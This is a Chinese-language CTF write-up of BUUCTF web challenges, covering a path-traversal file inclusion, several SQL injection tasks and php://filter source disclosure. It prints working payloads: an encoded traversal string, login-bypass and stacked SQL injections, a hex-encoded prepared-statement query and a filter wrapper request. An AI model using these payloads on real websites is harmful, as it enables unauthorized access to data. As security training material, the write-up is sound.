# BUUCTF web记录


## 0x00 [HCTF 2018]WarmUp

[题目链接](https://buuoj.cn/challenges#[HCTF%202018]WarmUp)

引入眼帘的是个滑稽🤔

![image-20210226211946197](image-20210226211946197.png "image-20210226211946197")

F12看源码，发现页面注释里提示源码在`source.php`。

```php
// source.php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

从`source.php`中还可以看到`hint.php`也包含一些信息。

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
}
```

查看`hint.php`，结果显示`flag`内容在`ffffllllaaaagggg`。直接访问该文件，发现无法访问（当然没这么简单了）

![image-20210226212604043](image-20210226212604043.png "image-20210226212604043")

再继续分析`source.php`，get的`file`参数要非空、为字符串且通过`checkFile()`函数判断，才能进入到`include`逻辑。

```php
if (! empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
   ) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}  
```

那就来看`checkFile()`函数，该函数返回true的地方一共有3处。

首先定义了一个白名单。请求的文件名在白名单中即返回`true`，对应于之前提到的`source.php`和`hint.php`。显然这个逻辑无法被用来读取`flag`。

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
}

if (in_array($page, $whitelist)) {
    return true;
}
```

第二个逻辑中，参数首先被根据`?`字符进行截取，截取后的内容如果在白名单中则返回`true`。这个也无法被用来读取`flag`。

相关函数：[mb_strpos()](https://www.php.net/manual/zh/function.mb-strpos)、[mb_substr()](https://www.php.net/manual/zh/function.mb-substr)

```php
$_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
);
if (in_array($_page, $whitelist)) {
	return true;
}
```

再看最后一个返回true的逻辑。发现其先将get请求中的file参数进行一次URL解码，然后再去截取`?`前的内容，判断是否在白名单内。同时，php在读取`$_REQUEST['file']`参数的时候，就会进行一次URL解码。所以，我们只需要在地址中加入`?`经过两次URL编码之后的内容`%253f`即可通过函数验证，并且使得参数在经过一次URL解码之后不含`?`，也就不会被当作其他get请求的参数。

```php
$_page = urldecode($page);
$_page = mb_substr(
    $_page,
    0,
	mb_strpos($_page . '?', '?')
);
if (in_array($_page, $whitelist)) {
	return true;
}
```

所以，可以构造payload。逐级添加`../`，找到`ffffllllaaaagggg`文件路径所在。

```html
?file=source.php%253f/../../../../ffffllllaaaagggg
```

![image-20210226210928641](image-20210226210928641.png "image-20210226210928641")

最后结论：我一开始看到warmup几个大字，还以为直接F12，然后flag分为几段放在源码里...🤣🤣，pico入门题真是害人不浅啊。

## 0x01 [极客大挑战 2019]EasySQL

[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)

简单的注入，用户名输入`admin' or '1'='1' #`，密码随便输即可。

![image-20210227161029874](image-20210227161029874.png "image-20210227161029874")

但是把`#`换成`--`就不行，暂时还不知道为什么。

登录之后拿到flag

![image-20210227161238808](image-20210227161238808.png "image-20210227161238808")

## 0x02 [强网杯 2019]随便注

网页提供了一个输入框，点击提交将会发出get请求，参数为inject=\[输入的内容\]。看源码，注释里提示“sqlmap是没有灵魂的”。

我的尝试：

提交`admin' or '1'='1' #`，结果页面上显示这些东西。

```text
array(2) {
 [0]=>
 string(1) "1"
 [1]=>
 string(7) "hahahah"
}

array(2) {
 [0]=>
 string(1) "2"
 [1]=>
 string(12) "miaomiaomiao"
}

array(2) {
 [0]=>
 string(6) "114514"
 [1]=>
 string(2) "ys"
}
```

显然，这应该是查询语句所作用的表的所有记录，一共有3条。

为了找到flag，使用堆叠注入，输入`1';show tables;#`，查询所有表名。发现存在`words`和`1919810931114514`两个表。

![image1](image-20210227195602210.png "image1")

再使用desc查看两个表的结构，输入`1';desc words`，`1';desc 1919810931114514;# `。这里有个小trick，使用纯数字表名  要在表名前后加上 ``(这里由于markdown无法转义的问题，所以没有加入到行内代码块中，实际输入要在数字前后加上)。可以看到flag内容位于1919810931114514表中。

![image2](image-20210227202522051.png "image2")

![image3](image-20210227202426166.png "image3")

接下来要想办法查询到该表中的flag内容。直接堆叠注入查询语句，会发现`select`等关键字都被过滤掉了。

![image-20210227202949683](image-20210227202949683.png "image-20210227202949683")

于是有两种思路

### 思路1

使用MySql的prepare功能，这是一个类似于计划任务的功能。将select查询语句转换为16进制，然后prepare...from...来执行该语句。

```
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
```

### 思路2

直接修改表的名字，`rename`/`alter`等关键字是没有被筛选的，所以可以被输入执行。先将`words`表名改为其他名字，再将`1919810931114514`表名改为`words`。因为当前页面的查询对象就是表`words`，所以可以直接进行查询。

```
1';rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);#
1' or 1=1 #
```

## 0x03 [极客大挑战 2019]Havefun

[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun)

界面还挺好看的

![image-20210227205837574](image-20210227205837574.png "image-20210227205837574")

源码中有这么一段注释

<img src="image-20210227210040644.png" alt="image-20210227210040644" style="zoom:67%;" />

于是尝试get请求并且cat参数为dog，结果就出flag了...😓

![image-20210227210208421](image-20210227210208421.png "image-20210227210208421")

## 0x04 [SUCTF 2019]EasySQL

[题目链接](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)

输入`1';show tables;#`，没反应，输入`1;show tables;#`，查询到有一个`Flag`表。

<img src="image-20210228202256993.png" alt="image-20210228202256993" style="zoom:67%;" />

接下来肯定就是想办法获取`Flag`表中的内容了。

直接输入`1;select * from Flag;`，发现不让你查询，那肯定是过滤了`select`等关键字。

接下来就是学习别人的wp了😅。

据说这题比赛的时候给了源码，查询语句为

```mysql
select $_GET['query'] || flag from Flag
```

于是，可以输入`*,1`，使得被执行的查询语句为`select *,1||flag from Flag`，也就是`select *,1 from flag`。从而获取flag内容。

收获：注入的时候要先尝试带和不带`'`的输入，判断是**数字型**还是**字符型**注入。

## 0x05 [ACTF2020 新生赛]Include

[题目链接](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)

这题和下一题都是挺有意思的题：）

首先进入题目给出的地址，看到一个超链接tips，点击之后看到提示`file=flag.php`。但是我们只能看到提示文字，并不能看到flag内容。

![image-20210301225314513](image-20210301225314513.png "image-20210301225314513")

这个时候就需要知道有个东西叫做**php filter**，利用`php://filter`伪协议，我们可以获取`flag.php`文件的全部内容。访问`/?file=php://filter/convert.base64-encode/resource=flag.php`。

![image-20210301225641520](image-20210301225641520.png "image-20210301225641520")

将内容进行base64解码，于是得到了藏在php文件注释中的flag。

![image-20210301225743179](image-20210301225743179.png "image-20210301225743179")

## 0x06 [极客大挑战 2019]Secret File

[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)

进入网页，啥也没有。检查源代码，发现了一个隐藏的链接。

![image-20210301230157746](image-20210301230157746.png "image-20210301230157746")

![image-20210301230257773](image-20210301230257773.png "image-20210301230257773")

访问`/Archive_room.php`，很明显能做的只有点击secret链接。

![image-20210301230542428](image-20210301230542428.png "image-20210301230542428")

查看secret对应的链接，为`/action.php`，但是点击之后的结果却是`/end.php`。

![image-20210301230700409](image-20210301230700409.png)

![image-20210301230805292](image-20210301230805292.png "image-20210301230805292")

于是，需要用到Burpsuite，拦截一下对action.php的访问。发现提示信息`secr3t.php`

![image-20210301223830280](image-20210301223830280.png "image-20210301223830280")

发现`secr3t.php`提供了文件包含服务，并且提示你flag在flag.php中。

![image-20210301230956851](image-20210301230956851.png "image-20210301230956851")

了解了上一题的套路之后，应该就能想到，直接获取`/secr3t.php?file=flag.php`，应该是不会直接给你flag的😁。

![image-20210301231222300](image-20210301231222300.png "image-20210301231222300")

于是，又是和上一题一样的套路，使用filter，获取flag.php内容，然后再解码。

![image-20210301231417059](image-20210301231417059.png "image-20210301231417059")

## 0x07 [极客大挑战 2019]LoveSQL

[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL)

还是不太会...

参考wp：

- [https://blog.csdn.net/SopRomeo/article/details/103979047](https://blog.csdn.net/SopRomeo/article/details/103979047)
- [https://blog.csdn.net/xixihahawuwu/article/details/109999044?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=af7328be-e424-4bcb-a3e6-e102be9d0ff9&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control](https://blog.csdn.net/xixihahawuwu/article/details/109999044?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=af7328be-e424-4bcb-a3e6-e102be9d0ff9&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control)

只能记录一下自己接触了啥新概念吧

- 测试注入类型
- 使用`1' order by x#`，测试不同x的值，根据什么时候报错来确定表的列数
- union联合查询
